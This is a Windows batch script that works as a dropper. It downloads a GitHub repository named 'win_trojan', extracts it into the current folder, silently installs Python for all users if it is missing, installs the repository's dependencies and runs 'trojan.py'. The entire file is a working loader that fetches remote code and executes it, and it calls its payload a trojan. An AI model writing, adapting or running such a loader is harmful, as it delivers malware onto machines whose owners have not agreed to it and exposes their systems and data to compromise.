@echo off
SETLOCAL EnableDelayedExpansion

:: --- Configuration ---
SET "REPO_URL=https://github.com/Noah-school/win_trojan/archive/refs/heads/main.zip"
SET "ZIP_FILE=win_trojan.zip"
SET "TEMP_EXTRACT=temp_extra"
SET "PYTHON_EXE=python"

echo [*] Starting setup in current directory: %~dp0
cd /d "%~dp0"

:: 1. Download the repository
echo [*] Downloading repository...
powershell -Command "Invoke-WebRequest -Uri '%REPO_URL%' -OutFile '%ZIP_FILE%'"
if %ERRORLEVEL% neq 0 (
    echo [!] Failed to download.
    pause
    exit /b
)

:: 2. Extract and Move Files to Root
echo [*] Extracting files directly to current folder...
:: Extract to a temp folder first to handle the GitHub subfolder structure
powershell -Command "Expand-Archive -Path '%ZIP_FILE%' -DestinationPath '%TEMP_EXTRACT%' -Force"

:: Move everything from the 'win_trojan-main' subfolder to the current directory
xcopy "%TEMP_EXTRACT%\win_trojan-main\*" "." /E /H /Y /Q

:: 3. Cleanup temp files
echo [*] Cleaning up temporary files...
rd /S /Q "%TEMP_EXTRACT%"
del "%ZIP_FILE%"

:: 4. Check if Python is installed
echo [*] Checking for Python...
%PYTHON_EXE% --version >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [!] Python not found. Downloading installer...
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe' -OutFile 'python_installer.exe'"
    echo [*] Installing Python (Silent)...
    start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1
    del python_installer.exe
    SET "PATH=%PATH%;%ProgramFiles%\Python311\;%ProgramFiles%\Python311\Scripts\"
)

:: 5. Install requirements (now in the same folder)
if exist "requirements.txt" (
    echo [*] Installing dependencies...
    %PYTHON_EXE% -m pip install --upgrade pip
    %PYTHON_EXE% -m pip install -r requirements.txt
)

:: 6. Run the script
if exist "trojan.py" (
    echo [*] Launching trojan.py...
    %PYTHON_EXE% trojan.py
) else (
    echo [!] Error: trojan.py not found in the current directory.
)

pause
